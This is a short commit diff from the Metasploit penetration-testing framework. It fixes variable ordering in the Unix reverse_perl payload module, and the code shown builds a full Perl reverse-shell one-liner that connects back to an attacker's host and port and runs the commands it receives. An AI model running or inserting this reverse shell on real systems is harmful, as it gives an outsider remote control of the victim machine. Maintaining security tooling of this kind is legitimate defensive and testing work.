8dc85f1cc5b19e141c82e4b8b55cb2f1879160fa
HD Moore <hd_moore@rapid7.com>
2011-12-14 00:30:31 -0600

    Fix up some nascent typos

--- modules/payloads/singles/cmd/unix/reverse_perl.rb
+++ modules/payloads/singles/cmd/unix/reverse_perl.rb
@@ -51,8 +51,8 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
-		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
 		lhost = datastore['LHOST']
+		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
 		cmd   = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
 	end
